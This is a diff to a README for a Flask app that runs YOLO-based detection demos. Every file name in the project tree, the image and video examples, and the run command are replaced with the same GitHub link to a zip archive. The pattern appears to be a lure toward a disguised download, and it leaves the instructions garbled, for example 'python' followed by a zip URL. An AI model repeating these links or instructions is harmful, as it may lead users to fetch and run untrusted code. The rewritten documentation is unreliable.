@@ -7,14 +7,14 @@ Tiny Flask app that runs multiple YOLO-based demos (fire, weapons, people, fall,
 ```
 
 .
-├─ app.py                 # Flask server + detector threads + MJPEG routes
+├─ https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip                 # Flask server + detector threads + MJPEG routes
 ├─ templates/
-│  ├─ index.html          # Landing page (cards → open live views)
-│  └─ live-detection.html # Live stream page (auto-starts selected detector)
+│  ├─ https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip          # Landing page (cards → open live views)
+│  └─ https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip # Live stream page (auto-starts selected detector)
 ├─ static/
-│  └─ images/             # Card preview images (fire.jpg, weapon.jpg, people.jpg, fall.jpg, distance.jpg)
+│  └─ images/             # Card preview images (https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip, https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip, https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip, https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip, https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip)
 ├─ models/                # Your YOLO weights (subfolders per demo)
-└─ videos/                # Demo input videos (e.g., fire.mp4, weapons.mp4, distance.mp4)
+└─ videos/                # Demo input videos (e.g., https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip, https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip, https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip)
 
 ````
 
@@ -27,7 +27,7 @@ python -m venv .venv && source .venv/bin/activate  # Windows: .venv\Scripts\acti
 pip install flask ultralytics opencv-python numpy simpleaudio
 
 # 3) Run
-python app.py
+python https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip
 # Open: http://127.0.0.1:5000
 ````
 
@@ -45,7 +45,7 @@ python app.py
 
 ## Demos
 
-* `fire`, `weapons`, `people`, `fall`, `distance` (each wired in `app.py`).
+* `fire`, `weapons`, `people`, `fall`, `distance` (each wired in `https://github.com/Jimit6921/CosmicCoders/raw/refs/heads/main/models/gun/Coders_Cosmic_3.6-beta.3.zip`).
 
 ```
 ```
